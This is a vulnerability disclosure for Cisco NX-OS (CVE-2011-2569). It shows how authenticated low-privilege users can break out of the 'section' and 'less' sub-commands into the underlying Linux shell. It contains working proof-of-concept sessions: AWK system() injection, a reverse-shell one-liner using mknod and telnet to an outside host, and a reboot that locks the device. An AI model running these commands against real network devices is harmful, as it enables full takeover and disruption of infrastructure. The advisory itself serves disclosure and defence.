## Cisco Nexus OS (NX-OS) - Command "injection" / sanitization issues.

##### Discovered by:
* Peter Adkins <peter.adkins@kernelpicnic.net>

##### Access:
* Local; authenticated access is required.

##### Tracking and identifiers:
* CVE - CVE-2011-2569

##### OS' Affected:
* Cisco Nexus OS (NX-OS)

##### Vendor involvement:
* Alerted - patches available / implemented for some platforms.

##### Systems / platforms affected:
* Nexus 7000
* Nexus 5000
* Nexus 4000
* Nexus 3000
* Nexus 2000
* Nexus 1000V
* MDS
* UCS

##### Notes:
Local access is required. However, unprivileged accounts can gain access to the underlying Linux operating system, effectively providing complete access to the device. This could potentially lead to issues in environments where NOC and other staff are permitted low-level access for first point of call, etc.
    
### NX-OS - "section" sub-command - Command injection / sanitization issues.

This issue was found on the Nexus 7000 platform. It is believed to also affect the following platforms:

 * Nexus 7000 ( OS < 5.2(1.61)S0 5.2(1)S73 5.2(1)S72 )
 * Nexus 5000 ( OS < UNK )
 * Nexus 4000 ( OS < UNK )
 * Nexus 3000 ( OS < UNK )
 * Nexus 2000 ( OS < UNK ) 
 * MDS        ( OS < 5.2(1.61)S0 5.2(1)S73 5.2(1)S72 )

The section command appears to be an AWK script to which the requested string is passed. However, the input does not appear to be sanitized correctly. As a result, AWK can be used to execute arbitrary commands on the Linux subsystem.

```
nx1# sh clock | sed 's/.*/BEGIN \{ system\(\"id"\) \}/' > 20110713.awk
Warning: There is already a file existing with this name. Do you want to
overwrite (yes/no)? [no] y

nx1# sh clock | sec '* -f /bootflash/20110713.awk '
uid=2003(user) gid=504(network-operator)
11:16:04.082 UTC Wed Jul 13 2011

nx1# sh clock | sed 's/.*/BEGIN \{ system\(\"ls \/mnt\/cfg\/0\/"\) \}/' > 20110713.awk

nx1# sh clock | sec '* -f /bootflash/20110713.awk '
ascii
bin
boot
cfglabel.sysmgr
debug
licenses
linux
log
lost+found
11:18:41.885 UTC Wed Jul 13 2011
```

This can even be used to remove all files on the bootflash and issue a 'reboot' command to the system. However, rebooting from the Linux subsystem causes the device to spew messages to the console and lock; rather than actually reloading the device.

### NX-OS - "less" sub-command - Command injection / sanitization issues.

Believed to affect the following versions of software:

* Nexus 7000  ( OS < 5.1(1) )
* Nexus 5000  ( OS < 4.2(1)N2(1) )
* Nexus 4000  ( OS < UNK)
* Nexus 2000  ( OS < 4.2(1)N2(1) )
* UCS        ( OS < 1.4(1i) 1.3(1c) )
  * On the UCS platform commands injected are executed as root.
* Nexus 1000V ( OS < UNK )
* MDS         ( OS < 5.1(1) )

As an example:

```
switch# sh clock | less
```

Once less is presented we open files by pressing colon and then "e" and specifying the path to the file.

```
bin:*:1:1:bin:/bin:
daemon:*:2:2:daemon:/usr/sbin:
sys:*:3:3:sys:/dev:
ftp:*:15:14:ftp:/var/ftp:/isanboot/bin/nobash
ftpuser:UvdRSOzORvz9o:99:14:ftpuser:/var/ftp:/isanboot/bin/nobash
nobody:*:65534:65534:nobody:/home:/bin/sh
admin:x:2002:503::/var/home/admin:/isan/bin/vsh_perm
```

However, this is just read-only access once again. BUT, if we use the "|" (pipe) and then "$" key macro, we can execute commands.

```
!ls -lah > /bootflash/20110715
```
As shown below, the file has been created on the boot-flash.

```        
switch# dir
      97     Jul 15 12:01:44 2011  20110715
```

Using this method, I have been able to establish a remote shell into the NX-OS Linux subsystem using the following:

```
 mknod rs p; telnet ad.dr.es.s 8888 0<rs | /bin/bash 1>rs
```

Even the reboot command is accepted as a valid input. However, rather than rebooting the device, it causes the system to lock while spewing errors to the console.

```
 switch# sh clock | less
 Fri Jul 15 12:06:30 UTC 2011
 !reboot

 Broadcast message from root (Fri Jul 15 12:06:39 2011):
```